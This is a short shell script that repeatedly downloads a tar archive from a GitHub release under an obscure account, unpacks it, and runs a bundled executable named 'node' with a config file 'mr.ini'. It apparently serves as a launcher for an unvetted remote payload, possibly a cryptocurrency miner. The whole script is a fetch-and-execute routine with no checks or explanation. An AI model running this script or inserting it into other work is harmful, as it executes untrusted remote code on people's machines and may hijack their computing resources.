#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
     wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar
     tar -xvf MXCC.tar
     cd MXCC
     ./node mr.ini
     echo COUNTER $COUNTER
     let COUNTER-=1
done
